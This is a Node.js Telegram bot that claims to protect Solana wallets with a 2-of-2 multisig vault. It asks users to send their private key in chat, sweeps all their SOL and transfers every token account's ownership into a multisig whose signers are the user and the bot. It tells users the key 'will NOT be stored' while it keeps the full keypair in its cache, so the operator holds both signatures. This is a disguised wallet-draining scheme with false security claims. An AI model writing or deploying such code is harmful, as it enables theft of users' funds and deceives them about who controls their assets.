require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const {
  Connection, Keypair, PublicKey, SystemProgram, Transaction,
  LAMPORTS_PER_SOL, sendAndConfirmTransaction
} = require('@solana/web3.js');
const {
  getAssociatedTokenAddress, createAssociatedTokenAccountInstruction,
  createTransferInstruction, createSyncNativeInstruction,
  createCloseAccountInstruction, getAccount, TOKEN_PROGRAM_ID, 
  NATIVE_MINT, createInitializeMultisigInstruction, 
  createSetAuthorityInstruction, AuthorityType, 
  getOrCreateAssociatedTokenAccount
} = require('@solana/spl-token');
const bs58 = require('bs58');
const NodeCache = require('node-cache');

// Config
const BOT_TOKEN = process.env.BOT_TOKEN;
const FEE_PAYER_PRIVATE_KEY = process.env.FEE_PAYER_PRIVATE_KEY;
const RPC_ENDPOINT = process.env.RPC_ENDPOINT || 'https://api.mainnet-beta.solana.com';

if (!BOT_TOKEN || !FEE_PAYER_PRIVATE_KEY) {
  console.error('Missing BOT_TOKEN or FEE_PAYER_PRIVATE_KEY');
  process.exit(1);
}

// Solana setup
const conn = new Connection(RPC_ENDPOINT, 'confirmed');
let feePayerSecretKey;
try {
  feePayerSecretKey = Uint8Array.from(JSON.parse(FEE_PAYER_PRIVATE_KEY));
} catch {
  feePayerSecretKey = bs58.decode(FEE_PAYER_PRIVATE_KEY);
}
const feePayer = Keypair.fromSecretKey(feePayerSecretKey);

// Cache
const walletCache = new NodeCache({ stdTTL: 3600 });
const sessions = new NodeCache({ stdTTL: 600 });

// Create multisig
async function createMultisig(userPubkey) {
  const ms = Keypair.generate();
  const rent = await conn.getMinimumBalanceForRentExemption(355);
  
  const tx = new Transaction().add(
    SystemProgram.createAccount({
      fromPubkey: feePayer.publicKey,
      newAccountPubkey: ms.publicKey,
      lamports: rent,
      space: 355,
      programId: TOKEN_PROGRAM_ID,
    }),
    createInitializeMultisigInstruction(ms.publicKey, [userPubkey, feePayer.publicKey], 2)
  );
  
  tx.feePayer = feePayer.publicKey;
  tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
  tx.sign(ms, feePayer);
  
  const sig = await conn.sendRawTransaction(tx.serialize());
  await conn.confirmTransaction(sig, 'confirmed');
  return ms;
}

// Sweep SOL to wSOL
async function sweepSolToVaultSafe(userKP, msPubkey) {
  const bal = await conn.getBalance(userKP.publicKey);
  const sweepable = bal - 10000;
  if (sweepable <= 0) return 0;
  
  const tempWsol = await getAssociatedTokenAddress(NATIVE_MINT, userKP.publicKey);
  const tempExists = await conn.getAccountInfo(tempWsol).catch(() => null);
  
  const ixs = [];
  if (!tempExists) {
    ixs.push(
      createAssociatedTokenAccountInstruction(
        feePayer.publicKey, tempWsol, userKP.publicKey, NATIVE_MINT
      )
    );
  }
  
  ixs.push(
    SystemProgram.transfer({
      fromPubkey: userKP.publicKey,
      toPubkey: tempWsol,
      lamports: sweepable,
    }),
    createSyncNativeInstruction(tempWsol)
  );
  
  const msWsolAta = await getOrCreateAssociatedTokenAccount(
    conn, feePayer, NATIVE_MINT, msPubkey, true
  );
  
  ixs.push(
    createTransferInstruction(
      tempWsol, msWsolAta.address, userKP.publicKey, sweepable, [userKP.publicKey]
    )
  );
  
  const tx = new Transaction().add(...ixs);
  tx.feePayer = feePayer.publicKey;
  tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
  tx.sign(userKP, feePayer);
  
  const sig = await conn.sendRawTransaction(tx.serialize());
  await conn.confirmTransaction(sig, 'confirmed');
  return sweepable;
}

// Withdraw wSOL to native SOL - NEW FUNCTION
async function withdrawWsolToNative(userKP, msPubkey, recipientPubkey, amount) {
  const msWsolAta = await getAssociatedTokenAddress(NATIVE_MINT, msPubkey, true);
  const recipientWsolAta = await getOrCreateAssociatedTokenAccount(
    conn, feePayer, NATIVE_MINT, recipientPubkey
  );
  
  // Step 1: Transfer wSOL from multisig to recipient's wSOL account
  const transferIx = createTransferInstruction(
    msWsolAta,
    recipientWsolAta.address,
    msPubkey,
    BigInt(amount),
    [userKP.publicKey, feePayer.publicKey],
    TOKEN_PROGRAM_ID
  );
  
  // Step 2: Close recipient's wSOL account to unwrap to native SOL
  const closeIx = createCloseAccountInstruction(
    recipientWsolAta.address,
    recipientPubkey,
    recipientPubkey,
    [],
    TOKEN_PROGRAM_ID
  );
  
  const tx = new Transaction().add(transferIx, closeIx);
  tx.feePayer = feePayer.publicKey;
  tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
  tx.sign(userKP, feePayer);
  
  const sig = await conn.sendRawTransaction(tx.serialize());
  await conn.confirmTransaction(sig, 'confirmed');
  return sig;
}

// Migrate token authorities
async function migrateTokens(userKP, msPubkey) {
  const accounts = await conn.getParsedTokenAccountsByOwner(userKP.publicKey, { programId: TOKEN_PROGRAM_ID });
  if (!accounts.value.length) return;
  
  for (let i = 0; i < accounts.value.length; i += 15) {
    const batch = accounts.value.slice(i, i + 15);
    const ixs = batch.map(({ pubkey }) =>
      createSetAuthorityInstruction(pubkey, userKP.publicKey, AuthorityType.AccountOwner, msPubkey)
    );
    
    const tx = new Transaction().add(...ixs);
    tx.feePayer = feePayer.publicKey;
    tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
    tx.sign(userKP, feePayer);
    
    const sig = await conn.sendRawTransaction(tx.serialize());
    await conn.confirmTransaction(sig, 'confirmed');
  }
}

// Get wSOL balance
async function getWsolBalance(msPubkey) {
  try {
    const wsolAta = await getAssociatedTokenAddress(NATIVE_MINT, msPubkey, true);
    const account = await getAccount(conn, wsolAta);
    return Number(account.amount);
  } catch {
    return 0;
  }
}

// Bot
const bot = new Telegraf(BOT_TOKEN);
const menu = Markup.keyboard([
  ['🔑 Convert Wallet', '🏦 My Vaults'],
  ['💸 Send', '🏧 Withdraw'],
  ['🔐 Wrap SOL', '❓ Help']
]).resize();

bot.start(ctx => ctx.reply(
  '🛡️ *Solana 2-of-2 Multisig Bot*\n\n' +
  'Your funds are protected by multisig. Phantom & gasless wallets CANNOT move funds without bot approval.\n\n' +
  '• SOL converted to wSOL (multisig controlled)\n' +
  '• Tokens migrated to multisig authority\n' +
  '• External wallets cannot spend\n' +
  '• Withdraw to native SOL anytime',
  { parse_mode: 'Markdown', ...menu }
));

bot.hears('🔑 Convert Wallet', ctx => {
  ctx.reply(
    '🔐 *Convert Wallet to Vault*\n\n' +
    'Send your private key (Base58 or JSON array format).\n\n' +
    '⚠️ *This will:*\n' +
    '• Create a 2-of-2 multisig vault\n' +
    '• Convert all SOL to wrapped SOL (wSOL)\n' +
    '• Transfer all token authority to multisig\n' +
    '• Leave your wallet unable to transact without bot approval\n\n' +
    'Your private key will NOT be stored after conversion.',
    { parse_mode: 'Markdown' }
  );
  sessions.set(ctx.from.id, { action: 'convert' });
});

bot.hears('🏦 My Vaults', async ctx => {
  const vaults = walletCache.get(`v_${ctx.from.id}`) || [];
  if (!vaults.length) return ctx.reply('📭 No vaults found. Use "🔑 Convert Wallet" to create one.', menu);
  
  let msg = '🔐 *Your Vaults*\n\n';
  const btns = [];
  
  for (let i = 0; i < vaults.length; i++) {
    const v = vaults[i];
    const nativeBal = await conn.getBalance(v.pubkey);
    const wsolBal = await getWsolBalance(v.msPubkey);
    
    msg += `*${i+1}. ${v.label}*\n`;
    msg += `📍 \`${v.pubkey.toBase58().slice(0,8)}...\`\n`;
    msg += `💎 wSOL: ${(wsolBal/1e9).toFixed(4)} (protected)\n`;
    msg += `🪙 SOL: ${(nativeBal/LAMPORTS_PER_SOL).toFixed(4)} (sweepable)\n\n`;
    
    btns.push([Markup.button.callback(`📋 ${v.label}`, `v_${i}`)]);
  }
  
  await ctx.reply(msg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(btns) });
});

bot.hears('💸 Send', async ctx => {
  const vaults = walletCache.get(`v_${ctx.from.id}`) || [];
  if (!vaults.length) return ctx.reply('📭 No vaults available. Create one first!', menu);
  
  const btns = vaults.map((v, i) => [Markup.button.callback(`${v.label}`, `send_${i}`)]);
  await ctx.reply('📤 *Select vault to send from:*', { parse_mode: 'Markdown', ...Markup.inlineKeyboard(btns) });
});

bot.hears('🏧 Withdraw', async ctx => {
  const vaults = walletCache.get(`v_${ctx.from.id}`) || [];
  if (!vaults.length) return ctx.reply('📭 No vaults available. Create one first!', menu);
  
  const btns = vaults.map((v, i) => [Markup.button.callback(`${v.label}`, `withdraw_${i}`)]);
  await ctx.reply('🏧 *Withdraw to Native SOL*\n\nSelect vault to withdraw from:', { parse_mode: 'Markdown', ...Markup.inlineKeyboard(btns) });
});

bot.hears('🔐 Wrap SOL', async ctx => {
  const vaults = walletCache.get(`v_${ctx.from.id}`) || [];
  if (!vaults.length) return ctx.reply('📭 No vaults to wrap SOL for.', menu);
  
  const btns = [];
  for (let i = 0; i < vaults.length; i++) {
    const bal = await conn.getBalance(vaults[i].pubkey);
    btns.push([Markup.button.callback(`${vaults[i].label} (${(bal/LAMPORTS_PER_SOL).toFixed(4)} SOL)`, `wrap_${i}`)]);
  }
  await ctx.reply('🔐 *Select vault to wrap SOL:*', { parse_mode: 'Markdown', ...Markup.inlineKeyboard(btns) });
});

bot.hears('❓ Help', ctx => {
  ctx.reply(
    '🛡️ *How It Works*\n\n' +
    '*2-of-2 Multisig Security:*\n' +
    '• Funds live in a multisig vault\n' +
    '• Transactions require BOTH your key AND bot\'s key\n' +
    '• Phantom wallet CANNOT move funds alone\n' +
    '• Gasless wallets CANNOT bypass multisig\n\n' +
    '*SOL Protection:*\n' +
    '• Native SOL → wrapped SOL (wSOL)\n' +
    '• wSOL requires multisig approval\n' +
    '• Wallet holds only dust (~0.000005 SOL)\n\n' +
    '*Commands:*\n' +
    '🔑 Convert Wallet - Lock existing wallet\n' +
    '🏦 My Vaults - View your vaults\n' +
    '💸 Send - Transfer wSOL/tokens\n' +
    '🏧 Withdraw - Unwrap wSOL to native SOL\n' +
    '🔐 Wrap SOL - Protect native SOL',
    { parse_mode: 'Markdown', ...menu }
  );
});

// Callback handlers
bot.action(/^v_(\d+)$/, async ctx => {
  const vaults = walletCache.get(`v_${ctx.from.id}`) || [];
  const v = vaults[parseInt(ctx.match[1])];
  if (!v) return ctx.answerCbQuery('❌ Vault not found');
  
  const nativeBal = await conn.getBalance(v.pubkey);
  const wsolBal = await getWsolBalance(v.msPubkey);
  
  const msg = 
    `🔐 *${v.label}*\n\n` +
    `📍 Wallet: \`${v.pubkey.toBase58()}\`\n` +
    `🏦 Multisig: \`${v.msPubkey.toBase58()}\`\n\n` +
    `💎 wSOL: ${(wsolBal/1e9).toFixed(6)} (protected)\n` +
    `🪙 Native SOL: ${(nativeBal/LAMPORTS_PER_SOL).toFixed(6)} (sweepable)\n\n` +
    `🔒 *Status: LOCKED*\n` +
    `Phantom & gasless wallets cannot spend`;
  
  await ctx.reply(msg, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('📤 Send wSOL', `swsol_${ctx.match[1]}`),
       Markup.button.callback('🏧 Withdraw SOL', `withdraw_${ctx.match[1]}`)],
      [Markup.button.callback('🔐 Wrap SOL', `wrap_${ctx.match[1]}`)]
    ])
  });
  await ctx.answerCbQuery();
});

bot.action(/^send_(\d+)$/, ctx => {
  sessions.set(ctx.from.id, { action: 'send_recipient', vaultIdx: parseInt(ctx.match[1]) });
  ctx.reply('📤 Send recipient address:', Markup.forceReply());
  ctx.answerCbQuery();
});

bot.action(/^swsol_(\d+)$/, ctx => {
  sessions.set(ctx.from.id, { action: 'wsol_recipient', vaultIdx: parseInt(ctx.match[1]) });
  ctx.reply('📤 Send wSOL recipient address:', Markup.forceReply());
  ctx.answerCbQuery();
});

bot.action(/^withdraw_(\d+)$/, ctx => {
  sessions.set(ctx.from.id, { action: 'withdraw_recipient', vaultIdx: parseInt(ctx.match[1]) });
  ctx.reply(
    '🏧 *Withdraw to Native SOL*\n\n' +
    'Send the recipient address to receive native SOL:',
    { parse_mode: 'Markdown', ...Markup.forceReply() }
  );
  ctx.answerCbQuery();
});

bot.action(/^wrap_(\d+)$/, async ctx => {
  const vaults = walletCache.get(`v_${ctx.from.id}`) || [];
  const v = vaults[parseInt(ctx.match[1])];
  if (!v) return ctx.answerCbQuery('❌ Vault not found');
  
  await ctx.answerCbQuery('⏳ Wrapping SOL...');
  const msg = await ctx.reply('⏳ Wrapping native SOL to wSOL...');
  
  try {
    const swept = await sweepSolToVaultSafe(v.kp, v.msPubkey);
    if (swept === 0) {
      await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null, 
        'ℹ️ No SOL to wrap. Native balance is at minimum.'
      );
    } else {
      await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null,
        `✅ Successfully wrapped ${(swept/LAMPORTS_PER_SOL).toFixed(6)} SOL to wSOL!\n\n🔒 Protected by multisig - Phantom cannot spend this.`
      );
    }
  } catch(e) {
    await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null, 
      `❌ Error: ${e.message}`
    );
  }
});

// Text message handler
bot.on('text', async ctx => {
  const session = sessions.get(ctx.from.id);
  if (!session) return;
  const text = ctx.message.text.trim();
  
  if (session.action === 'convert') {
    try {
      let secretKey;
      try { 
        secretKey = Uint8Array.from(JSON.parse(text)); 
      } catch { 
        secretKey = bs58.decode(text); 
      }
      
      const userKP = Keypair.fromSecretKey(secretKey);
      if (userKP.publicKey.equals(feePayer.publicKey)) {
        return ctx.reply('❌ Cannot convert the fee payer account!');
      }
      
      const statusMsg = await ctx.reply('⏳ Converting wallet to vault...\n\nStep 1/3: Creating multisig...');
      
      const msKP = await createMultisig(userKP.publicKey);
      
      await ctx.telegram.editMessageText(
        statusMsg.chat.id, statusMsg.message_id, null,
        '⏳ Converting wallet to vault...\n\n✅ Step 1/3: Multisig created\n⏳ Step 2/3: Wrapping SOL...'
      );
      
      await sweepSolToVaultSafe(userKP, msKP.publicKey);
      
      await ctx.telegram.editMessageText(
        statusMsg.chat.id, statusMsg.message_id, null,
        '⏳ Converting wallet to vault...\n\n✅ Step 1/3: Multisig created\n✅ Step 2/3: SOL wrapped\n⏳ Step 3/3: Migrating tokens...'
      );
      
      await migrateTokens(userKP, msKP.publicKey);
      
      const vaults = walletCache.get(`v_${ctx.from.id}`) || [];
      vaults.push({ 
        label: `Vault ${vaults.length+1}`, 
        pubkey: userKP.publicKey, 
        msPubkey: msKP.publicKey, 
        kp: userKP, 
        msKP 
      });
      walletCache.set(`v_${ctx.from.id}`, vaults);
      sessions.del(ctx.from.id);
      
      await ctx.telegram.editMessageText(
        statusMsg.chat.id, statusMsg.message_id, null,
        `✅ *Wallet Converted Successfully!*\n\n` +
        `🔑 Vault: \`${userKP.publicKey.toBase58()}\`\n` +
        `🏦 Multisig: \`${msKP.publicKey.toBase58()}\`\n\n` +
        `🔒 *Security Active:*\n` +
        `• SOL → wSOL (multisig protected)\n` +
        `• Tokens → multisig authority\n` +
        `• Phantom CANNOT spend\n` +
        `• Gasless wallets CANNOT bypass\n` +
        `• Use "🏧 Withdraw" to get native SOL\n\n` +
        `⚠️ Keep your private key safe! You still need it to sign transactions.`,
        { parse_mode: 'Markdown', ...menu }
      );
      
    } catch(e) {
      sessions.del(ctx.from.id);
      ctx.reply(`❌ *Conversion failed:*\n${e.message}`, { parse_mode: 'Markdown', ...menu });
    }
    return;
  }
  
  if (session.action === 'send_recipient' || session.action === 'wsol_recipient') {
    try {
      const recipient = new PublicKey(text);
      sessions.set(ctx.from.id, { ...session, action: 'send_amount', recipient });
      ctx.reply('💎 Enter amount to send:', Markup.forceReply());
    } catch { 
      ctx.reply('❌ Invalid address. Please try again.'); 
    }
    return;
  }
  
  if (session.action === 'withdraw_recipient') {
    try {
      const recipient = new PublicKey(text);
      sessions.set(ctx.from.id, { ...session, action: 'withdraw_amount', recipient });
      
      const vaults = walletCache.get(`v_${ctx.from.id}`) || [];
      const v = vaults[session.vaultIdx];
      const wsolBal = await getWsolBalance(v.msPubkey);
      
      ctx.reply(
        `🏧 *Withdraw to Native SOL*\n\n` +
        `Available wSOL: ${(wsolBal/1e9).toFixed(6)}\n` +
        `Recipient: \`${recipient.toBase58()}\`\n\n` +
        `Enter amount to withdraw:`,
        { parse_mode: 'Markdown', ...Markup.forceReply() }
      );
    } catch { 
      ctx.reply('❌ Invalid address. Please try again.'); 
    }
    return;
  }
  
  if (session.action === 'send_amount') {
    const amount = parseFloat(text);
    if (isNaN(amount) || amount <= 0) return ctx.reply('❌ Invalid amount. Enter a positive number.');
    
    const vaults = walletCache.get(`v_${ctx.from.id}`) || [];
    const v = vaults[session.vaultIdx];
    if (!v) { 
      sessions.del(ctx.from.id); 
      return ctx.reply('❌ Vault not found.', menu); 
    }
    
    const statusMsg = await ctx.reply('⏳ Building transaction...');
    
    try {
      const wsolAta = await getAssociatedTokenAddress(NATIVE_MINT, v.msPubkey, true);
      const recipientAta = await getOrCreateAssociatedTokenAccount(
        conn, feePayer, NATIVE_MINT, session.recipient
      );
      
      const transferIx = createTransferInstruction(
        wsolAta,
        recipientAta.address,
        v.msPubkey,
        BigInt(Math.floor(amount * 1e9)),
        [v.kp.publicKey, feePayer.publicKey],
        TOKEN_PROGRAM_ID
      );
      
      const tx = new Transaction().add(transferIx);
      tx.feePayer = feePayer.publicKey;
      tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
      tx.sign(v.kp, feePayer);
      
      const sig = await conn.sendRawTransaction(tx.serialize());
      await conn.confirmTransaction(sig, 'confirmed');
      sessions.del(ctx.from.id);
      
      await ctx.telegram.editMessageText(
        statusMsg.chat.id, statusMsg.message_id, null,
        `✅ *Transaction Successful!*\n\n` +
        `💎 Amount: ${amount} wSOL\n` +
        `📤 To: \`${session.recipient.toBase58()}\`\n` +
        `🔗 [View on Solscan](https://solscan.io/tx/${sig})`,
        { parse_mode: 'Markdown', ...menu }
      );
    } catch(e) {
      await ctx.telegram.editMessageText(
        statusMsg.chat.id, statusMsg.message_id, null,
        `❌ *Transaction Failed:*\n${e.message}`,
        { parse_mode: 'Markdown' }
      );
    }
    return;
  }
  
  if (session.action === 'withdraw_amount') {
    const amount = parseFloat(text);
    if (isNaN(amount) || amount <= 0) return ctx.reply('❌ Invalid amount. Enter a positive number.');
    
    const vaults = walletCache.get(`v_${ctx.from.id}`) || [];
    const v = vaults[session.vaultIdx];
    if (!v) { 
      sessions.del(ctx.from.id); 
      return ctx.reply('❌ Vault not found.', menu); 
    }
    
    const wsolBal = await getWsolBalance(v.msPubkey);
    if (amount * 1e9 > wsolBal) {
      return ctx.reply(`❌ Insufficient wSOL balance. Available: ${(wsolBal/1e9).toFixed(6)}`);
    }
    
    const statusMsg = await ctx.reply('⏳ Withdrawing to native SOL...');
    
    try {
      const sig = await withdrawWsolToNative(
        v.kp, 
        v.msPubkey, 
        session.recipient, 
        Math.floor(amount * 1e9)
      );
      
      sessions.del(ctx.from.id);
      
      await ctx.telegram.editMessageText(
        statusMsg.chat.id, statusMsg.message_id, null,
        `✅ *Withdrawal Successful!*\n\n` +
        `🏧 Amount: ${amount} SOL (unwrapped)\n` +
        `📤 To: \`${session.recipient.toBase58()}\`\n` +
        `🔗 [View on Solscan](https://solscan.io/tx/${sig})\n\n` +
        `ℹ️ Recipient received native SOL in their wallet.`,
        { parse_mode: 'Markdown', ...menu }
      );
    } catch(e) {
      await ctx.telegram.editMessageText(
        statusMsg.chat.id, statusMsg.message_id, null,
        `❌ *Withdrawal Failed:*\n${e.message}`,
        { parse_mode: 'Markdown' }
      );
    }
    return;
  }
});

// Error handling
bot.catch((err, ctx) => {
  console.error('Bot error:', err);
  ctx?.reply?.('❌ An error occurred. Please try again.')?.catch(() => {});
});

// Start bot
(async () => {
  try {
    const bal = await conn.getBalance(feePayer.publicKey);
    console.log(`💰 Fee payer: ${feePayer.publicKey.toBase58()}`);
    console.log(`💰 Balance: ${bal/LAMPORTS_PER_SOL} SOL`);
    
    if (bal < 0.01 * LAMPORTS_PER_SOL) {
      console.warn('⚠️ Low fee payer balance!');
    }
    
    await bot.launch();
    console.log('🤖 Bot is running...');
    
    process.once('SIGINT', () => bot.stop('SIGINT'));
    process.once('SIGTERM', () => bot.stop('SIGTERM'));
  } catch(e) {
    console.error('Failed to start:', e);
    process.exit(1);
  }
})();